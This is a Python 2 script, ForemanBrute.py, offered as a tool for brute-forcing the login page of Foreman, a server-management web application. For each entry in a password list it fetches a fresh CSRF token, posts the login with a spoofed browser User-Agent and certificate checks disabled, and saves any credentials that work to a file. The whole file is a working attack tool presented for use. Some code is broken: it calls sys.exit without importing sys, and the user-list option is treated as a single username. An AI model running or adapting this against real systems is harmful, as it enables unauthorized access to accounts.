#!/usr/bin/python
#================================================================================================
#                                       ForemanBrute.py
#
#           @Author:        Hamza Bourrahim
#           @Description:   ForemanBrute allows you To bruteForce the login page of Foreman
#
#================================================================================================


from sys import argv
import requests
import logging
import argparse
import urllib
from BeautifulSoup import BeautifulSoup as Soup
import re
try:
    import http.client as http_client
except ImportError:
    # Python 2
    import httplib as http_client
import traceback
from requests.packages.urllib3.exceptions import InsecureRequestWarning

#===================================================================
#                           Colors
#===================================================================
RED         = "\033[31m"
GREEN       = "\033[32m"
BLUE        = "\033[34m"
CYAN        = "\033[36m"
L_YELLOW    = "\033[93m"
L_CYAN      = "\033[96m"
L_RED       = "\033[91m"
L_GREEN     = "\033[92m"
DEFAULT     = "\033[0m"

ACTION  = L_CYAN + "[+] " + DEFAULT
ERROR   = L_RED + "[+] " + DEFAULT
OK      = L_GREEN + "[+] " + DEFAULT

#===================================================================
#                           Init
#===================================================================
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#===================================================================
#                           Defs
#===================================================================


def urlencode_withoutplus(query):
    if hasattr(query, 'items'):
        query = query.items()
    l = []
    for k, v in query:
        k = urllib.quote(str(k), safe=' /!')
        v = urllib.quote(str(v), safe=' /!')
        l.append(k + '=' + v)
    return '&'.join(l)

def header():
    print L_GREEN + "================================================================================================"
    print L_RED + "\t\t\t\tForemanBrute.py"
    print ""
    print L_YELLOW + "@Author:\tHamza Bourrahim"
    print L_CYAN + "@Description:\tForemanBrute allows you To bruteForce the login page of Foreman"
    print L_GREEN + "================================================================================================"
    print "" + DEFAULT

'''
checkSuccess
@param: html (String)
Searches the response HTML for our specified success message
'''
def checkErrorMessage(html, message):
 # get our soup ready for searching
 soup = Soup(html)
 # check for our success message in the soup
 search = soup.findAll(text=re.compile(message))

 if not search:
  success = False
 else:
  success = True
# return the brute force result
 return success

def findCsrfToken(s, url):

    target_page = s.get(url, verify=False)
    # Get the intial CSRF token from the target site
    page_source = target_page.text
    if args.debug:
        print page_source
    soup = Soup(page_source);
    csrf_token = soup.findAll(attrs={"name": "authenticity_token"})[0].get('value')

    return csrf_token

def SendBrute(s, url, user, password, csrf_token):
    payload = {'login[login]': user, 'login[password]': password, 'authenticity_token': csrf_token}
    headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
            'cache-control': "no-cache",
        }
    r = s.post(url, data=payload, headers=headers, verify=False)

    return r

def writeResult(user, password):
    file = open("result.ForemanBrute","w")

    file.write("====================================\n")
    file.write("Valid Credentials:\n")
    file.write("\tUser:" + user + "\tPassword:" + password + "\n")
    file.write("====================================\n")

    file.close()

#===================================================================
#                           main
#===================================================================
if __name__ == "__main__":
 parser = argparse.ArgumentParser(description='ForemanBrute allows you To bruteForce the login page of Foreman')
 parser.add_argument('-l', nargs=1, help="set the users List")
 parser.add_argument('-p', nargs=1, help="set the password List")
 parser.add_argument('-u', nargs=1, help="set the target URL, It can be Https or Http")
 parser.add_argument('-m', nargs=1, help="Set the error message")
 parser.add_argument('--verbose',
   action='store_true',
   help='verbose flag' )
 parser.add_argument('--debug',
   action='store_true',
   help='For debuging requests' )

 args = parser.parse_args()

 try:
     header();
     if args.l and args.p and args.u and args.m:
         # give our arguments more semantic friendly names
         if args.debug:
             http_client.HTTPConnection.debuglevel = 1
             logging.basicConfig()
             logging.getLogger().setLevel(logging.DEBUG)
             requests_log = logging.getLogger("requests.packages.urllib3")
             requests_log.setLevel(logging.DEBUG)
             requests_log.propagate = True
         script = ""
         success_message = ""
         #txt = open(args.p)
         # set up our target, cookie and session
         url = args.u[0]
         user = args.l[0]
         # Loop through our provided password file
         with open(args.p[0]) as f:
          s = requests.Session()
          print ACTION + "Running brute force attack {"+ url +"}"
          for password in f:
           password = password.strip('\n')
           print ACTION + "Handling Credentials {" + user + "}{" + password + "}"
           print "\t" + ACTION + "getting CSRF token"
           csrf_token = findCsrfToken(s, url)
           if csrf_token:
               print "\t" + OK + "CSFF Token found : " + csrf_token
           # setup the payload
           print "\t" + ACTION + "Sending Request"
           bruteResult = SendBrute(s, url, user, password, csrf_token)
           if args.debug:
               print bruteResult.text
           #check if invalid authencity_token
           m_token = checkErrorMessage(bruteResult.text,"ERF42-4995")
           if m_token:
               print "\t" + ERROR + "Got Invalid Token"
           else:
               found = checkErrorMessage(bruteResult.text, args.m[0])
               if not found:
                   print "\t" + OK + "Login/password Correct"
                   print ACTION + "Storing valid credentials to {result.ForemanBrute} and quiting"
                   writeResult(user, password)
                   sys.exit(0)
               else:
                   print "\t" + ERROR + "Login/password Incorrect"

     else:
         print ERROR + "use --help for help"

 except Exception, err:
   print ERROR + "An HTTP error occurred\n"
   if args.verbose:
       traceback.print_exc()
